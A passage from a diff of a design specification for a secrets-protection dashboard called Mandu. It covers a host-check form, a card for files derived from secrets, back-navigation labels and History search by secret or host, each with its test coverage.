+form, **Check a host**: a box (`api.example.com`) and **Check**, with the
+note "Which of your secrets may go to a host, and what happens to the
+rest. Checking changes nothing."
+
+- *What it asks.* `GET /api/policy/host-check?host=…`
+  (`server/host-check-routes.ts`) calls the arbiter's `whyHost`, the op
+  behind `mandu why <host>`: a read on the data socket that reads the
+  rules and asks the egress gate as a probe (`kind: "probe"`), so nothing
+  is queued in Approvals and nothing is counted. The arbiter is not
+  changed. The adapter forwards it as it forwards `whyPath`. The route
+  first checks the host (`checkedHost`): it is trimmed and lowercased, a
+  pasted `https://`, port, path, query or trailing dot is stripped, and
+  anything else (empty, a space, a user name, an address in brackets, a
+  wildcard, more than 253 characters) is refused 400 with "Type a host
+  name, like api.example.com: no https://, no path." An arbiter without
+  the op answers 501 and the page hides the form; a protection service
+  that does not answer is 503 (the admin boundary) or 502, and the page
+  says it in the words *What the rules say* uses (`refusalText`).
+- *The words* (`view-model/host-check.ts`, `hostCheckWords`), one sentence
+  each, every name as code:
+  - "2 of your secrets may be sent there: `~/app/.env`, `STRIPE_KEY`."
+    A file is `~/…`; a value a `values:` rule binds there on its own is
+    `~/…: KEY`; a registered variable is its name. A file whose rule has a
+    row under Your rules drawn now is a button that opens it there
+    (`treeRule` / `openRuleRow`, as the lists do); any other stays code.
+    None: "None of your secrets may be sent there."
+  - "Any other secret sent there: Mandu asks you first." Or "… Mandu
+    blocks it." or "… it goes out." (the probe's `release.unbound`:
+    `requiresApproval`, neither, `allow`), with ", as an earlier answer of
+    yours says" or ", as a rule of yours says" when the stage was a
+    remembered answer (`verdict`) or a rule of yours (`user-rule`). No
+    answer from the gate: "Mandu could not work out what happens to any
+    other secret sent there." The sentence says what the probe decides
+    for a secret with no binding for that host, which includes one bound
+    elsewhere; it is no promise about prompt text or untrusted data.
+  - An issuer's API host, in the words of Built-in protections
+    (§4.25z): "This is Stripe's API host: a Stripe key goes here without
+    asking.", or "… a Stripe key sent here asks you first." when
+    `issuer_bindings` has it off.
+  - Each `connect: allow` row of `destinations:` for the host (or for
+    every host): "Your agent's programs may connect to it on port 443
+    (your rule)." (any port, over UDP, every host as the row says).
+  - "You answered 3 earlier sends to this host. Find them in Approvals."
+    The link opens Approvals with Answered earlier found by the host
+    (`/approvals?q=<host>`, §4.25 *Finding an answer*; an in-page link
+    carries the search as `data-land` "q:<host>", as Plugins' link to
+    History does). A send still waiting is not counted.
+  - "1 send to this host waits for your answer in Approvals." / "3 sends
+    to this host wait …" (`waiting`, 2026-10-27): the `whyHost` entries
+    still `pending`, so a person deciding about a host in Rules learns that
+    the very send they decide about waits, and where to answer it.
+    Approvals is a plain link, no `q`: its Waiting section comes first, and
+    Answered earlier's search finds no waiting card. A prompt hold
+    (`prompt:…`) is no send and is not counted, as the arbiter's own
+    `pendingAsks` leaves it out. A send whose session ended still counts:
+    Approvals still lists it, under its ended-sessions heading.
+  - "A rule change waiting in Approvals would change this." (`pending`),
+    with Approvals a link.
+  - Protection off (`axis: false`): "Protection is off: nothing is held
+    back from any host.", then only the connect rows.
+- *Never a value.* The answer carries paths, names, hosts, decisions and
+  counts. `whyHost`'s earlier answers, and the sends still waiting, name
+  each send by its `$MDU:` placeholder: the view-model counts them and
+  drops them, so no placeholder reaches the page.
+- *Access.* Open, as `/api/policy/by-who` (`read-gate.ts`): names and
+  hosts, never a value. The box writes nothing; the focus stays in the
+  form after Check, and only the answer under it is drawn again
+  (`role="status"`).
+- *Asked again at each Rules read (2026-10-30).* While an answer is
+  drawn, each Rules read (`loadRules`: Rules opened, an answer or a Save,
+  Remove or changed answer on Rules, a change made elsewhere) asks again
+  for the host of that answer (`recheckHost`), never the box's text, with
+  no "Checking…". So after you answer the waiting send in Approvals, or
+  save a rule that changes the host, the box says what holds now. The
+  re-ask takes a number from the same counter as Check: a Check pressed
+  meanwhile wins, and a late re-ask never covers a newer answer. An answer
+  that would draw as the one on screen does (the same host and sentences,
+  and each file a button or not, marked or not, as Your rules is drawn
+  now) is not drawn again (`hostCheckKey`), at a re-ask, at the card's own
+  redraw on each read, or at a tab switch: its nodes and the focus on them
+  stay, and the status box says nothing new. A changed one is drawn in
+  place, once; a focus inside it falls back to the page, as when the box is
+  cleared. A failed re-ask draws what a failed Check draws (`refusalText`;
+  501 hides the form), since the old answer can no longer be vouched for.
+  Nothing is asked while the box is empty, still checking or showing a
+  refusal, nor at a tab switch. It is the same read-only probe.
+- *Asked again when the questions waiting change (2026-10-31).* A send
+  that starts waiting, or one answered Allow once or Block once in
+  another tab or on a phone, reads no Rules: `rulesVersion` leaves out
+  the questions waiting and the one-time answers, rightly for Your
+  rules. So the answer follows the waiting questions on their own
+  (`followHostWaiting`, beside `followRules` on each Home poll): while
+  Rules is shown and the tab is visible, the ids in the poll's `waiting`
+  are compared with those the last host ask was made with (`HC.waiting`:
+  the ids of the Home answer at that ask, set by Check, by a Rules read's
+  ask and by a poll's, never by a poll that asks nothing). When they
+  differ, the drawn answer's host
+  is asked again through `recheckHost`, with the same counter, no
+  "Checking…" and no redraw of the same answer. So "1 send to this host
+  waits for your answer" shows within one poll of the agent's send, and
+  goes within one poll of an answer given anywhere. A quiet poll asks
+  nothing. So does a poll while no answer is drawn. A poll leaves the ask
+  to a Rules read (your rules changed too, a Save) only while that read is
+  out: asked since the poll was asked and not yet answered, dropped or
+  failed (`RULES_SEEN.out`, the newest read's number, cleared however it
+  ends). Only that read then asks with this poll's ids: at most one ask
+  per poll. Until 2026-11-04 (queue item #303) any read begun since the
+  poll was asked was left the ask, and the poll stored its ids
+  unasked: a read that answered first, inside a slow poll, asked with the
+  ids before it, and with no file row drawn the answer stayed stale until
+  the questions waiting changed again. A hidden tab compares nothing,
+  and the first poll after it returns does. Until 2026-11-03 nothing else
+  on Rules was read again. Since then (queue item #284) a change of the
+  ids also reads your rules again when file rows are drawn, for their
+  "Waiting for your answer" line (§4.25n, `followFileWaiting`), and that
+  read asks the host instead: still one ask per poll. With the focus in a
+  text field on Rules the host alone is asked, as before.
+- *What it leaves out.* `mandu why` also says whether the host is
+  reachable at a default launch, from the connect-guard set the launcher
+  computes (`computeNetGuardSpecs`). That set is the launcher's, not the
+  arbiter's, so the box claims no reachability beyond the
+  `destinations:` rows.
+
+Tests: `host-check.test.ts` (every branch: bound or none, a value and a
+variable by name; any other secret asked, blocked or sent, by an earlier
+answer or a rule; issuer on and off; the connect rows; the answers a count,
+a waiting send not counted; the waiting sends a count, one and several,
+linked with no search, a prompt hold not counted; pending; protection off;
+the order; no `$MDU:`
+and no value in any output; the vocabulary sweep; the host checked and
+refused), `host-check-routes.test.ts` (a pasted URL stripped, empty, a
+space, a user name and too long refused before the arbiter is asked; 501
+without `whyHost` or a service; 503 and 502; open in the read gate; a POST
+asks nothing), `home-js-host-check.test.ts` (the form in the card; the
+typed host sent and the sentences, links and file buttons drawn; the focus
+kept on Enter and on Check; a file button opening its rule; Find them in
+Approvals landing with the search; the waiting line's Approvals link
+with no search, opening Approvals; a refusal, a service down and an empty
+box in words; 501 hiding the form; no write; a file whose rule names
+nothing marked after its name, the real one not; asked again at each Rules
+read: back from Approvals by the waiting line's link and the top bar's
+Rules, and after a Remove on Rules, exactly one more request, for the
+drawn host and not text typed since, the new answer drawn with no
+Checking…; an unchanged answer keeping its nodes and a focused file
+button its focus; a file's rule gone redrawing it as plain code; nothing
+asked with nothing checked, after a refusal or at a tab switch; a failed
+re-ask in words; a Check pressed during a re-ask winning), and the stack e2e
+`tests/stack/rules-host-check.test.ts` (the production wiring over a real
+arbiter: `~/app/.env` bound to `api.stripe.com` named there, an unbound
+key held for your OK as the egress gate itself holds a real one, an
+earlier answer counted, `pastebin.com` naming none, no value and no
+placeholder in the JSON, nothing queued; the served page at 1280 and
+390 px; a real Chromium at 1280 and 390 px drawing the answer inside the
+screen with no sideways scroll; a send the real gate holds counted as
+waiting with its link, then, answered, gone from that line and counted as
+an answer; on the served page, a send the real gate holds answered, then
+Approvals and Rules by the page's own links: the box drops the waiting
+line and counts the answer with no Check press, no value, no placeholder).
+
 **Tests.** `rules-by-who.test.ts` (Figure 7's example per program, host and
 AI, each program row only what differs with its rest count; an unvetted
 reader on an `others: twin` rule reading Everything; a named masked copy
 kept where other programs are refused; every named row's items plus its
-rest equal the secret rules; the pinned script needing your word; an unknown level; page labels
+rest equal the secret rules; each own AI listing only its `local-model` files and its rest,
+"Everything" with none, two own AIs alike, *Any AI* unchanged; the pinned script needing your word; an unknown level; page labels
 joining; unread is not empty; the vocabulary sweep with the retired words;
 the *Opens it* line and the per-program view reading the same judgment;
 every item's `rule`, a value's and a pattern's included),
 `home-js-by-who.test.ts` (hidden until read; the rows and their lists per
 tab; `deploy`'s one list and its rest line under it, not a link, the closing
-row unchanged; a row with only a rest line showing it, not "Nothing under
+row unchanged; `vllm-1`'s one list and its rest line on the AI tab; a row with only a rest line showing it, not "Nothing under
 your rules."; arrow keys and the remembered tab; no control in the list but the
 files, and no write; a file in each tab opening its row with the focus on
 its ⋯, a value its file's; a folded folder unfolded first, another left
 folded; an item with no row, or Your rules unread, as plain code; the
-note's words; the link chip's look and its 4.5:1 in both themes; the empty
-and partial lines; the sweep over the rendered card; the
+note's words; the link chip's look and its 4.5:1 in both themes; a rule on
+nothing marked on each tab, in its button's name and for a value, never a
+pattern's nor a rule with no row; the empty
+and partial lines, an empty partial tab's own line on each tab with the note
+not repeating it; the sweep over the rendered card; the
 12px floor and one column at phone width), and the stack e2e
 `tests/stack/rules-per-principal.test.ts` (over a real arbiter and
 dashboard: policy.yaml rules and a label made on the page, every tab,
@@ -16302,7 +21886,129 @@ file in a named row's lists or counted by its rest, and
 the egress gate releasing the file's key at the host the view names and at
 no other; the levels as the arbiter reads them; no value in the answer;
 the served page at 1280 and 390 px, where a file in the Programs tab
-opens its row under a folded ~/ws, focused, and no value is shown).
+opens its row under a folded ~/ws, focused, and no value is shown; and a
+dashboard with no secrets arbiter over a policy.yaml with no `paths:`, whose
+served card never says "No rule of yours").
+
+**Files made from your secrets (2026-10-26).** Mandu labels a file on its
+own when what wrote it held a secret, and every later session reads it at
+that level (confidentiality.md §4 and §8). The arbiter keeps each such
+file in its derived-label store, raised in three cases: an AI session that
+read a secret as it was writes it (`labelWrittenPath`, the session's key
+and its tool); a program that held a secret writes it, a build that read
+`.env` writing `dist/config.js` (`labelWrittenPathTainted`, `tool:
+"process"`, the session's key or `proc:<key>`); a protected file is copied,
+linked or moved (`followDerivedLabel`, `tool` `identity`, `link` or
+`rename`, the session's key, the source's, or `guard`). `/api/secrets`
+already sent them as `panel.derived` (`view-model/secrets.ts`
+`toDerivedRow`), and the page already read that answer, but until
+2026-10-26 the only list of them was the developer view's *Derived files*
+table. When a later session could not read `.env.bak`, nothing on the
+product page said why.
+
+- **Where.** A card after *Who may get your secrets*, **Files made from
+  your secrets (N)**, with a section link (`#made-from`) under the page's
+  title. It is hidden, and its link with it, while there are none, and
+  when the answer has no `derived` (an older arbiter, a failed read). It
+  is closed until **Show** (`aria-expanded`; Hide closes it), so a long
+  list never pushes Keys Mandu found down. Its one line: "Files Mandu
+  keeps secret because something holding a secret wrote them." Opened:
+  "Mandu keeps these files as secret as what they were made from: each
+  was written by an AI session that had read a secret as it was, by a
+  program that held a secret, or copied from a secret file. To decide for
+  one yourself, open it and choose who may read it; your own rule for a
+  file comes first."
+- **A row** (`home.js renderMadeFromSecrets`, `madeFromRow`), newest
+  first: the path as code (`~/…`, broken at its slashes by `longName`) ·
+  the level in the words Rules uses (`levelText`: No AI, Your own AI
+  only, Any AI, when it asks), or for a row your exact rule overrides
+  "Your rule decides now: " and the level a later session reads
+  (`effective`) · what wrote it · when (`whenNode`) · **Change who may read
+  it**, a link to `/rules?file=<path>` that opens the file in Add a rule
+  (`landAtFile`), where your rule on the exact path is the standing
+  release §8 names, asked about like any rule that lets more through.
+- **What wrote it, in words, never a raw key.** `process`: "written by a
+  program that held a secret"; `identity` or `link`: "copied from a secret
+  file"; `rename`: "moved from a secret file"; any other: "written by the
+  AI", with "'s <tool>" when a tool is recorded. A key that names a session
+  (not `proc:…`, not `guard`) adds " in this session", a link to its page
+  (`/agents/<key>`), whose "Session not found" covers one past its 90
+  days. The record holds no agent name, so the words do not guess one.
+  One helper (`home.js writerWords`) words both this row and the file's
+  line in Add a rule, which reads it with a capital ("Written by a program
+  that held a secret") in the file's sub-line, its opened row, "This
+  folder:" and its send menu's tooltip (`inheritedSend`), so the two lists
+  cannot say different writers (2026-10-27; until then Add a rule said
+  "Written by the AI after it read a secret" for every such file, a
+  program's output and a copy included). After that line, **See it in
+  Files made from your secrets** (a button: it acts on this page) opens
+  this card, shows as many pages as reach the file's row
+  (`showMadeFromRow`), and puts the focus on the row's Change who may read
+  it; only a press moves the focus. A list drawn before `/api/secrets`
+  answered is drawn again once it does (`loadRules`).
+- **Many rows.** 20 entries, then Show more (`moreLine`) adds 20, the
+  first new entry's control taking the focus. A build writes a whole tree,
+  every file its own record, so **3 or more files in one direct parent
+  fold into one folder row** (`home.js madeFromEntries`,
+  `madeFromFolderRow`; 2026-10-31, queue item #191): the folder as code
+  (`~/shop/dist/assets/`, `longName`) · "312 files" · the level, only
+  when every file in it shows the same words (a row your rule overrides
+  counts as its "Your rule decides now: …") · what wrote them in
+  `writerWords`' words, only when every file shares them · the newest
+  file's time · **Show** (`aria-expanded`, `aria-controls`; Hide closes
+  it). The row never claims a level or a writer that one of its files does
+  not have. Opened, it lists its files as the card's rows, newest first,
+  indented under it, 20 then Show more. Only the direct parent groups:
+  `dist/` and `dist/assets/` are two folder rows; fewer than 3 stay file
+  rows. Folder and file rows sort together by their newest `updatedAt`, the
+  card's paging counts entries (a folder row is one), and the heading's
+  count and "N more files." stay counts of files. Which folders are open,
+  and how many of their files show, is kept (`MF.folders`): each Rules
+  read draws the card again with them open and the focus back on the same
+  control (a folder's Show or Show more, a file's link), compared by path,
+  never spliced into a selector. A folder's Show and Show more keep the
+  focus on the button or move it to the first new row's link. See it in
+  Files made from your secrets opens the file's folder row, with as many
+  of its pages as reach it. **No folder action**: a rule on the folder
+  would also cover files no secret made, so each file keeps its own
+  Change who may read it. Display only: no route, no arbiter change.
+- **No Clear button.** Clearing a record is a release, and a mutating
+  route on the product page is security core; the release the product
+  offers is your own rule on the file, made where every rule is made. The
+  developer view's *Derived files* table keeps Clear taint.
+- **Signed out.** The card shows only what `/api/secrets` already serves
+  this page (`server/read-gate.ts`: open, paths and names, never a value),
+  so it discloses nothing new.
+
+Tests: `ui/home-js-rules-made-from.test.ts` (hidden with no rows, no
+`derived` or a failed read, its section link with it; closed until Show;
+the three writers' words, the session's link and none for the others, no
+raw key; Change who may read it opening the file; the overridden row; 25
+rows as 20 and Show more; a long path split; the folder rows: 3 in one
+parent fold and 2 do not, the level and writer only when all agree,
+Show/Hide with `aria-expanded` and 20 then Show more inside, direct
+parents only, a folder counted as one entry, a Rules read keeping a
+folder open and the focus; the product words; Add a
+rule's line for a `process`, `identity`, `rename` and `Write` record in
+the card's words, in the sub-line, the opened row and the send tooltip;
+the fallback with no list; See it in Files made from your secrets focusing
+the row, past the first 20 too, inside its opened folder row; a list drawn before the read),
+`ui/home-js-section-links.test.ts` (the link, hidden with its card), and
+the stack e2e `tests/stack/rules-made-from-secrets.test.ts` (a real
+arbiter and dashboard: a HIGH session's Write, a program that read the
+registered `.env`, and `cp .env .env.bak` followed by the guard; the
+route's levels; the served page's rows, "No AI" for the two made from
+`.env`; the copy opened in Add a rule; neither the key, the memo the
+session read, a written file's bytes nor a raw key in the card or the
+route; each file landed in Add a rule saying its card row's writer, the
+build's program, the summary's Write and a second copy `notes.txt`'s
+"Copied from a secret file", `.env.bak` keeping "Built in: environment
+files", and See it in Files made from your secrets focusing the copy's
+row; and the build writing 24 more files in `dist/`: the card at (28)
+with two folder rows, `dist/` "25 files · No AI · written by a program
+that held a secret" and `app/` "3 files" with neither level nor writer,
+nothing but a path, a count and fixed words in them, 20 then the rest,
+and a file inside a folder still landing in Add a rule).
 
 #### 4.25ab One word per idea: the copy sweep (2026-10-11)
 
@@ -16640,7 +22346,11 @@ if it is not there, its section's heading. The button is described by its
 line (`aria-describedby`). Home's **Earlier** list does the same with the
 sessions it already has (the server sends every ended session in the
 window): ten, then "2 more sessions in the last 24 hours." and **Show
-them**, which draws the rest and gives the eleventh row the focus.
+them**, which draws the rest and gives the first row it brought the
+focus. A row where protection failed is never cut (2026-10-25): past the
+first ten, every `holds: false` row is drawn too, in its place, and Show
+them counts the rest, so the hero's "marked "protection failed" in the
+lists below" (§4.25, *Protection failed in several sessions*) stays true.
 
 **Words without the developer view.** The server knows whether it mounts
 the inspector (`DashboardServer.hasDev`, an extension named `inspector`)
@@ -16655,7 +22365,7 @@ Without it:
 | An OS step that did (its sentence: "Something reached the AI without a mask") | "Open the detailed trace to see what." | "What the leak check found, at the top of this page, says what." (§4.25ae) |
 | *Your secrets*, a fired leak check (secret-story.ts) | "… cannot say what the AI saw. Open the detailed trace." | "… cannot say what the AI saw. What the leak check found, at the top of this page, says what." (§4.25ae) |
 | *Your secrets*, a release after a check | since §4.25ae, both builds: "Mandu released it N more times after a check: to `host` at 10:42; in a command at 10:43." | the same |
-| Home's hero, protection failed (home.ts) | "Open the detailed trace to see which." (one session, or the trace's list) | one session: "Open that agent's page to see which." (`to: "agent"`); several: "Each agent where it happened says "protection failed" below, and its page shows which." |
+| Home's hero, protection failed (home.ts) | "Open the detailed trace to see which." (one session, or the trace's list) | one session: "Open that agent's page to see which." (`to: "agent"`); several (2026-10-25): "… in Claude Code in `~/shop` and Codex CLI in `~/api`. Open each to see which.", each place a link to its page (`to: "agent"`), three at most, then "and N more, each marked "protection failed" in the lists below" (§4.25, *Protection failed in several sessions*) |
 | Settings, a crashed helper (service-summary.ts) | "… for the developer view stopped unexpectedly. … The developer view has the details." | "A helper the dashboard runs stopped unexpectedly. Your agents are not affected." |
 | Settings, no protection service | "… The developer view lists what it does run." | "This dashboard does not run the protection service." |
 | The red tile (home.js) | "reached the AI unmasked. Open the detailed trace." | "reached the AI unmasked." |
@@ -16700,10 +22410,52 @@ this tab (`agentBack`, from the entry's `history.state.from`, which a
 pushed page change writes; §4.25 *Back and Forward keep your place*), and a
 plain click on it is the browser's Back (`history.back()`), so that page
 keeps your place. Its `href` is that page, for a click that opens a new
-tab. Opened from a fresh tab, a typed address, a reload with no entry
-before it, or from Rules, Settings or another agent page, it reads "Back
-to home" and is a link Home, as before. Tests: `home-js-back-restores.test.ts`
-B4, stack `tests/stack/history-back-restores.test.ts`.
+tab. Opened from a fresh tab, a typed address or a reload with no entry
+before it, it reads "Back to home" and is a link Home, as before; from
+another agent page, see the next paragraph. Tests:
+`home-js-back-restores.test.ts` B4, stack
+`tests/stack/history-back-restores.test.ts`.
+
+*A chain of session pages keeps where it started (2026-11-03, #291).* Until
+then a session opened from another session's page (Newer, Older, §4.25b, or
+any link between session pages) read "Back to home" and went Home as a new
+page, so after History → a row → Older → Older the one-click way back to
+History, its rows and your place was lost; only the browser's Back, pressed
+three times, found it. Now a pushed step from a session's page to another
+writes `{ from: 'agent', origin, depth }` in the new entry (`pushedState`):
+`origin` is the left entry's own `origin`, else its `from`; `depth` is the
+left entry's `depth` + 1, 1 for the first step. `agentBack` names `origin`
+(**Back to History**, **Back to Rules**, …, `backTo`), its `href` is that
+page, and a click goes back `depth + 1` entries at once (`history.go`,
+wireNav), so that page comes back as Back leaves it: History's rows, place
+and opened row, Rules' place. Each entry keeps its own origin and depth, so
+the browser's Back and Forward step one session at a time and every page on
+the way still names where the chain began. A chain started from **Home**
+reads "Back to home" and goes back to Home the same way, as one session
+opened from Home does. A chain with no page before it (a fresh tab, a typed
+address) keeps "Back to home" and a link Home. A tab that no longer holds
+the entries (`history.length` < `depth + 2`, a browser's cap on a tab's
+history) names the page but makes the click a link to it. Tests:
+`home-js-agent-neighbours.test.ts` N6 (History, Older twice, the click,
+Forward), `home-js-back-restores.test.ts` B4c (from Rules, from Home, from
+a fresh load, a tab short of entries), stack
+`tests/stack/agent-neighbours.test.ts` N2b.
+
+*Rules, Settings, Plugins and Scan name themselves (2026-10-29, #196).*
+Rules, Settings and Plugins link sessions too (Rules' *Files made from your
+secrets* "this session", Plugins' "Open its session", a session notice, the
+top bar's *Protection failed*), and opened from one of them the link read
+"Back to home" and dropped your place there. Since Back to Rules and
+Settings came to keep the place (2026-10-22, *Back and Forward keep your
+place*), the link only had to say so: it now reads **Back to Rules**,
+**Back to Settings**, **Back to Plugins** or **Back to Scan**, is Back as
+for History and Approvals, and its `href` is that page. Rules and Settings
+come back where you were, and Scan since 2026-10-29 (#228, *Back and
+Forward keep your place*), and Plugins too since 2026-10-31 (#243).
+The words come from `PAGE_NAMES`, as the tab title's do (`backTo`), so a
+page added later names itself; Home keeps "Back to home". Tests:
+`home-js-back-restores.test.ts` B4b, stack
+`tests/stack/agent-back-from-rules.test.ts` (Chromium, 1280 and 390 px).
 
 **Latest turn takes you to the newest turn (2026-10-22).** The story is
 drawn oldest first, so what the agent is doing now is the last card of a
@@ -16727,10 +22479,16 @@ session still lands at the top, so the header, the tiles and *Your secrets*
 are read first, and a poll redraw only rewrites the button's words (it is
 static in `index.html`, so a focus on it stays) and never moves the page.
 Under 520 px it takes its own line under the switch rather than squeezing
-the switch's count. Tests: `test/unit/ui/home-js-latest-turn.test.ts` (0, 1
+the switch's count. A running session's header goes there too: its "last
+step 2 minutes ago" is a button whenever this one shows (2026-10-25, §4.25
+*The header says how long it ran*), and so does a Running now row's "last
+step" on Home, a link to `/agents/<id>?go=latest` that `landGo` turns into
+this press once the page is first drawn (2026-10-25, *A live row names its
+last step as well as its start*). Tests: `test/unit/ui/home-js-latest-turn.test.ts` (0, 1
 and 2 turns hidden, 3 shown; the time words and the name; the focus on the
 newest turn, or on its quiet line's button; a poll with one more turn
-rewrites the time and keeps the focus), stack
+rewrites the time and keeps the focus; L5-L6 `?go=latest`, once, the
+switch on, no turn), stack
 `tests/stack/agent-latest-turn.test.ts` (twelve turns over the real arbiter
 and anthropic-proxy, a real Chromium at 1280 and 390 px: the page opens at
 its top, the button beside the switch or under it, and the press brings the
@@ -16749,10 +22507,16 @@ first, no time window: the same live agent sessions Home reads
 (`buildSidebarSections`' live section, `isAgentSession`), so test, drill and
 watch runs and the system logs stay out. Each row is Home's row
 (`homeAgentRow`, shared with Running now and Earlier): the agent, its prompt
-label, where it ran, when it started or ended, "protection failed", its
+label, where it ran, when it started or ended, "protection failed",
+"protection was off" with the amber dot for a session that recorded the Off
+mode (§4.25, *A session that ran with protection off says so*), "less
+protection than usual", amber too, for one where a protection did not start
+(§4.21), its
 counts (from `HomeFacts`, cached per session, so a row, its Home row and its
 page agree), the questions it raised that still wait (*History says what
-waits for you*, below), and **Details** to its agent page. The data is
+waits for you*, below), and **Details** to its agent page.
+Under the search, *What the counts mean* says what each count and mark the
+drawn rows show means (§4.25 *What the counts mean*, *History's fold*). The data is
 `GET /api/home/history?after=<id>&limit=<n>&q=<words>&only=stepped-in`
 (`HistoryVM`: `total`, `rows`, `next`, `query` for a search, *Finding a
 session* below, and `only` for the switch, *Only the sessions where Mandu
@@ -16796,7 +22560,9 @@ most one read brings), with Show more's cursor kept for those; a row the
 read should have brought and did not is no longer listed, and goes. As
 the poll's other sections (*The poll keeps your place*, §4.25): the list
 is drawn again only when what it shows changed (`sameAsDrawn`, each row by
-`rowDrawnFrom`, its moment kept current by `refreshWhen`), then only the
+`rowDrawnFrom`, a running one by `liveDrawnFrom`, its moment kept current
+by `refreshWhen` and its last step by `moveLastSteps`, §4.25 *A live row
+names its last step*), then only the
 rows that changed (*The rows you read stay still*, 2026-10-15), and the
 focus goes back where it was (`pollPlace`/`pollRefocus`: the same row's
 Details, Show more, else the page's heading). A read that fails leaves
@@ -16838,7 +22604,15 @@ by its day (`data-session="day:2026-07-10"`, `:2` for a day listed again),
 so one already there stays in place; `refreshWhen` says each heading's
 words again from its day on every poll, so past midnight "Today" reads
 "Yesterday" with no row drawn again. Home's Running now and Earlier stay
-as they are: they are short lists. Nothing new is served. Tests: unit
+as they are: they are short lists. Since 2026-10-28 Approvals › Answered
+earlier draws the same headings over its answers, as `h3` (§4.34
+*Answers sit under their day*), and so does Rule changes over its
+changes (§4.25 *Changes sit under their day*). Nothing new is served. Since
+2026-10-28 a row's own moment agrees with its heading: one that ended
+the day before, 6 hours back or more, reads "ended yesterday" under
+"Yesterday", no longer "13 hours ago" or "1 day ago"; one ended under 6
+hours back across midnight still reads in hours (§4.25u *The relative
+words follow the calendar*). Tests: unit
 `home-js-history-days.test.ts` (a fixed clock in Seoul: today, yesterday,
 three days ago and last year each once before its rows, a running row
 under the day it started, UTC against Seoul, a poll with a new session on
@@ -16908,6 +22682,27 @@ every session again and gives the box the focus. Approvals › Answered
 earlier has the same box since 2026-10-22, over each answer's row words
 (§4.25 *Finding an answer*).
 
+*None found is said* (2026-10-29). Until then the status line was emptied
+and hidden when a search found nothing, and the sentence went only into
+the list, which is not a live region: the focus stays in the box, so a
+screen reader heard nothing, and a count gone silent sounds like a read
+still on its way. Now the line holds the list's sentence, without
+**Clear** ("No session matches “staging”.", or, with the switch on and a
+search typed, "Mandu has not stepped in in any session that matches
+“staging”."), marked `.sr-only` and not `hidden`: a live region whose
+`hidden` flips with its text is not announced by every screen reader.
+Nothing changes on screen. A count drops `.sr-only`; Clear empties and
+hides the line. The line is written only when its words change
+(`findCount`), so a poll that finds none again says nothing again. The
+sentence repeats the typed search, as the list already draws it, and
+nothing else. A read still on its way, a failed read and the switch's own
+"has not stepped in in the newest 200" keep the line as before. Rules'
+*Find a rule* already said its "No rule mentions …" in a status box.
+Tests: unit `home-js-history-search` F3/F8, `home-js-history-only` O3b,
+`home-js-answered-find` S3/S7, `home-js-rule-changes-find` F5/F11; stack
+`history-search` S3 (signed out, a search for the key: the line adds
+nothing beyond what was typed) and `approvals-answered-find` F5.
+
 *Why the match never reads an original.* The History read is open signed
 out (`read-gate.ts`), and a search answers one bit per query: had it
 matched originals, anyone who can reach the page could ask "does any
@@ -16967,6 +22762,151 @@ found exactly by `?q=shop`, the `~` form and the full path; signed out the
 same answer as signed in; a search for the key one of them pasted finds
 nothing; the served page draws the two).
 
+*On a phone, the box under its label* (2026-10-28). The label and the
+box shared one line at every width, the box's basis 220 px, so between
+the width where it wraps (about 345 px) and 500 px the box was squeezed
+beside "Find a session": at 390 px it held 235 px of text and its hint
+read "What you asked, the agent or the fo", losing the folder the search
+reads too. Below 500 px (the page's phone breakpoint) the box now takes
+its own line under its label, the form's whole width
+(`.history-search input[type="search"] { flex-basis: 100% }`), so its
+hint reads whole; Approvals' Find an answer and Find a change carry the
+same classes and follow the same rule. From 500 px nothing changes: the
+label and the box share a line. Tests: jsdom
+`home-js-history-search.test.ts` F7 (the box's basis at 320 to 499 px
+and from 500 px, and every Find box under the rule), stack
+`tests/stack/product-find-width.test.ts` (a real arbiter at `secrets`,
+the anthropic-proxy and the net-proxy in production wiring, one session
+and one answered send, in a headless Chromium: at 390 and 320 px
+`#history-q` and `#answered-q` sit under their labels, full width, their
+placeholders measured in the box's font fitting the box; at 980 px label
+and box share a line; no page carries the key's value or a token).
+
+*By a secret or a host* (2026-11-02, #249). The questions a person
+brings to History after a scare are about secrets and hosts: "which
+sessions touched my `.env`?", "when did `STRIPE_KEY` come up?", "what went
+to `pastebin.com`?". Each session's page answers them (its *Your secrets*
+cards, its sends), but the search read only the listing, so it found such
+a session only when the first prompt named the file. Now a session the
+listing does not find is also matched by the names its facts keep
+(`HomeFacts`, cached per session): each secret as its card's first line
+names it, masked before the AI saw it, read before it was marked, or not
+masked in an Off session (`kept`: "STRIPE_KEY in ~/proj/.env", "the file
+~/proj/deploy/staging.conf"; a path is read as drawn, `~/…`, and in full),
+and each host a send went to or was stopped on its way to
+(`HomeSessionFacts.hosts`, `sendHosts` in `session-kept.ts`: the sent and
+the blocked web steps of the same believed story `kept` reads; a host is
+matched alone, never the words around it). Every word must still hold,
+between the listing and these names together. A session whose leak check
+fired is found by its listing alone, since its cards claim nothing.
+`historyFactNames` and `historyFactsMatch` in `view-model/home.ts`, pure.
+A row found this way, and not by its own words, says why under its line
+(`found` on the row, `foundLine` in `home.js`): **"Found here: STRIPE_KEY
+in ~/proj/.env and a send to api.stripe.com"** (a host only blocked reads
+"a blocked send to …", and each name links to its place since #301,
+below), at most three names, then
+"and N more"; a row its own words find draws nothing new. The hint
+became "What you asked, a folder, a secret or a host" (the agent's name
+still finds it), and it still reads whole at 390 and 320 px.
+
+*The look-through and its count.* A name is known only once a session's
+facts are counted, so a search now looks through the sessions from the
+newest, as the switch does, to at most `HISTORY_SCAN_BUDGET` (200) past
+where the read starts: a session its listing finds costs nothing, any
+other is matched over its facts (cached, so a poll or a later page pays
+only for sessions not counted yet). `total` counts the matches among the
+sessions looked through. When the look-through reached the oldest session
+the count is exact and the line reads as before, "3 of 214 sessions",
+with "N more sessions." and Show more; any history of up to 200 sessions
+is always read whole. When it stopped short, the answer adds
+`query.through` and `query.of` (the sessions it could look through), the
+line reads "3 in the newest 200 of 514 sessions" and the more line
+"Looked through 200 of 514 sessions." with Show more, which goes on from
+the last session looked through; with none found yet the list says "None
+of the newest 200 of 514 sessions matches “stripe”.", never "No session
+matches", which a capped read cannot know. With the switch on, both
+filters hold over one look-through, and `total` is every session it may
+look through, as without a search: how many sessions match is not known
+before every one is read, so its line reads "Showing the sessions where
+Mandu stepped in that match “stripe”" (until then ", of N sessions
+found").
+
+*Why names and hosts, and never a value.* The route is still open signed
+out, and the session page (`/api/home/agent`) already serves each card's
+name and each send's host to the same reader: the search answers from no
+more than that. It never matches an original: the names are what the
+cards say a secret stands for (a variable's name, a key and its file, a
